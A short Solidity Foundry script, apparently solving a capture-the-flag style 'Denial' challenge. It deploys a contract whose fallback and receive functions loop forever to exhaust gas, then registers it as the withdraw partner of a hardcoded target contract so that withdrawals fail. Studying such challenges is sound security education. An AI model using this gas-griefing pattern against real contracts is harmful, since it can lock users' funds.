/// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

contract RevertingContract {
    fallback() external payable {
        while (true) {
            // Infinite loop to consume all gas
        }
    }

    receive() external payable {
        while (true) {
            // Infinite loop to consume all gas
        }
    }
}

interface IDenial {
    function setWithdrawPartner(address _partner) external;

    function withdraw() external;
}

contract Denial is Script {
    function run() public {
        vm.startBroadcast();

        RevertingContract revertingContract = new RevertingContract();
        IDenial denial = IDenial(0x68a16aA14B9Df089c9892308dc3f17bBD0211D92);
        denial.setWithdrawPartner(address(revertingContract));

        vm.stopBroadcast();
    }
}
